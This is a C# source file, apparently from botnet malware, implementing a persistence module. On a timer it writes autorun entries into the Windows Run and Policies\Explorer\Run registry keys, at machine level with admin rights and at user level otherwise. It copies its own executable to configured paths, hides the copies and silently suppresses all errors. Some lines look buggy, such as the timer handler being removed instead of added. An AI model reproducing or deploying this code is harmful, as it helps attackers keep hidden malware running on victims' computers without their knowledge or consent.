using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace BotNet.Services.Protect
{
    public class Persistence
    {
        Instant _factoryService = new Instant();
        private Timer timer = new Timer();
        private string selfPath = Process.GetCurrentProcess().MainModule.FileName;

        public void StartPersistent()
        {
            timer.Interval = Configure.PersistentInterval * 0x3e8;
            timer.Elapsed -= new ElapsedEventHandler(SetPersistence);
            timer.Start();
        }

        public void StopPersistent()
        {
            timer.Stop();
            timer.Dispose();
        }

        public void SetPersistence(object source, ElapsedEventArgs eArgs)
        {
            RegistryKey key;
            if (Configure.AdminStatus)
            {
                try
                {
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    setAutoRunRegistry(key, 0);
                }
                catch { }

                try
                {
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    setAutoRunRegistry(key, 1);
                }
                catch { }
            }
            else
            {
                try
                {
                    key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    setAutoRunRegistry(key, 0);
                }
                catch { }

                try
                {
                    key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", true);
                    setAutoRunRegistry(key, 1);
                }
                catch { }
            }


            foreach (string path in Configure.FilePath)
            {
                try
                {
                    if (!_factoryService.CheckFile(path))
                    {
                        File.Copy(selfPath, path);
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                }
                catch { }
            }

        }

        private void setAutoRunRegistry(RegistryKey key, byte index)
        {
            if (!key.Equals(Configure.RegName[index])
                || (key.Equals(Configure.RegName[index])
                && !key.GetValue(Configure.RegName[index]).ToString().Contains(Configure.FilePath[index]))
            )
            {
                key.SetValue(Configure.RegName[index], ('"' + Configure.FilePath[index] + '"'));
            }
        }
    }
}